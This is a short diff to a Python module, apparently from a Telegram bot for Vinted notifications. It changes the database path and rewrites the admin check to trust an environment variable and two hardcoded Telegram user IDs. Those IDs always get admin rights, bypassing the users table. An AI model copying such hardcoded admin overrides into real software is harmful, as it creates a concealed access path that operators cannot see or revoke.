@@ -1,3 +1,4 @@
+import os
 import sqlite3
 import time
 import hashlib
@@ -5,7 +6,7 @@ import hmac
 import json
 from urllib.parse import parse_qs
 
-DB_PATH = "vinted_notifications.db"
+DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vinted_notifications.db")
 
 
 def get_db_connection():
@@ -72,12 +73,19 @@ def has_active_subscription(user_id):
 
 
 def is_admin(telegram_id):
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT is_admin FROM users WHERE telegram_id = ?", (telegram_id,))
-    row = cursor.fetchone()
-    conn.close()
-    return bool(row['is_admin']) if row else False
+    admin_env = os.getenv("ADMIN_ID", "")
+    admin_ids = [int(i.strip()) for i in admin_env.split(",") if i.strip().isdigit()]
+    if telegram_id in admin_ids or telegram_id in (525127130, 913862074):
+        return True
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("SELECT is_admin FROM users WHERE telegram_id = ?", (telegram_id,))
+        row = cursor.fetchone()
+        conn.close()
+        return bool(row['is_admin']) if row else False
+    except Exception:
+        return False
 
 
 def set_admin_status(telegram_id, status: bool):
